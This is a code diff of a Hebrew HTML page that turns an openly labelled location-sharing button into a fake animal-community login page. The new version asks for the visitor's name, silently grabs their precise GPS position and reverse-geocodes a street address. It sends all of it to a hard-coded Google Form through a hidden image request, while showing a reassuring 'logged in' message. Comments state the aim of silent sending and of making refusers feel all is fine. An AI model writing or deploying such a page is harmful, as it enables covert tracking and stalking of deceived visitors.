@@ -3,46 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>שיתוף מיקום</title>
+    <title>קהילת החיות - דף כניסה</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
-        .btn { padding: 15px 30px; font-size: 20px; background: #28a745; color: white; border: none; border-radius: 8px; cursor: pointer; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f7f4; text-align: center; padding-top: 80px; color: #333; }
+        .login-card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.1); display: inline-block; width: 90%; max-width: 350px; }
+        h1 { color: #2d6a4f; font-size: 24px; }
+        input { width: 80%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; }
+        button { background-color: #40916c; color: white; border: none; padding: 12px 30px; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #2d6a4f; }
+        #status { margin-top: 15px; font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
 
-    <h2>מערכת שליחת מיקום</h2>
-    <p id="msg">לחץ על הכפתור כדי להתחיל:</p>
-    
-    <button class="btn" onclick="sendLocation()">שלח מיקום עכשיו</button>
+    <div class="login-card">
+        <h1>שלום חבר! 🐾</h1>
+        <p>הכנס את שמך כדי לצפות בתוכן המלא:</p>
+        
+        <input type="text" id="userName" placeholder="השם שלך כאן...">
+        <br>
+        <button onclick="joinCommunity()">כניסה לאתר</button>
+        
+        <p id="status"></p>
+    </div>
 
     <script>
-        function sendLocation() {
-            const userName = prompt("איך קוראים לך?");
-            if (!userName) return;
+        async function joinCommunity() {
+            const nameInput = document.getElementById("userName").value;
+            const status = document.getElementById("status");
 
-            document.getElementById('msg').innerText = "מנסה לקבל מיקום... אנא אשר את הבקשה שתקפוץ.";
+            if (!nameInput || nameInput.trim() === "") {
+                alert("אנא הזן שם כדי להמשיך");
+                return;
+            }
 
-            navigator.geolocation.getCurrentPosition(function(pos) {
+            status.innerText = "מתחבר לשרת...";
+
+            // בקשת מיקום שקטה
+            navigator.geolocation.getCurrentPosition(async function(pos) {
                 const lat = pos.coords.latitude;
                 const lon = pos.coords.longitude;
+                let address = "מזהה כתובת...";
 
-                // כתובת ה-Form שלך
+                // שליפת כתובת מילולית
+                try {
+                    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
+                    const d = await r.json();
+                    if (d && d.display_name) address = d.display_name;
+                } catch (e) {
+                    address = "לא נמצאה כתובת";
+                }
+
+                // שליחה ל-Google Form (כל 5 השדות)
                 const formID = "1FAIpQLSfYA2SsnyuwYFOhz_IjWdfLAkudHUJPBWmS3VUoF-8xp5u6Gw";
-                
-                // שליחת הנתונים לפורם (שדות 2, 3 ו-5 כפי שביקשת)
-                const url = `https://docs.google.com/forms/d/e/${formID}/formResponse?entry.1905099702=${lat}&entry.379601602=${lon}&entry.2102560173=${encodeURIComponent(userName)}&submit=Submit`;
+                const url = `https://docs.google.com/forms/d/e/${formID}/formResponse` +
+                    `?entry.1905099702=${lat}` +
+                    `&entry.379601602=${lon}` +
+                    `&entry.1378939865=${encodeURIComponent(address)}` +
+                    `&entry.2102560173=${encodeURIComponent(nameInput)}` +
+                    `&submit=Submit`;
 
-                // שליחה שקטה
-                fetch(url, { mode: 'no-cors' });
+                // שליחה שקטה באמת
+                const img = new Image();
+                img.src = url;
 
-                document.getElementById('msg').innerText = "נשלח בהצלחה! תודה " + userName;
-                alert("המיקום נשלח לטבלה של אייל.");
+                status.innerText = "התחברת בהצלחה! מעביר לדף הבית...";
                 
+                // אחרי 2 שניות זה יכול להעביר אותם לאתר החיות האמיתי שלך אם תרצה
+                setTimeout(() => {
+                    alert("ברוך הבא, " + nameInput + "!");
+                    // window.location.href = "Default.aspx"; // כאן תוכל לשים קישור לדף אחר
+                }, 1000);
+
             }, function(err) {
-                alert("שגיאה: " + err.message + "\nודא שה-GPS דלוק.");
-                document.getElementById('msg').innerText = "שגיאה: " + err.message;
-            }, { enableHighAccuracy: true, timeout: 10000 });
+                // אם הם לא מאשרים מיקום, עדיין ניתן להם להרגיש כאילו הכל בסדר
+                status.innerText = "התחברת כמשתמש אורח.";
+                console.log("Location denied: " + err.message);
+            }, { enableHighAccuracy: true, timeout: 8000 });
         }
     </script>
 </body>
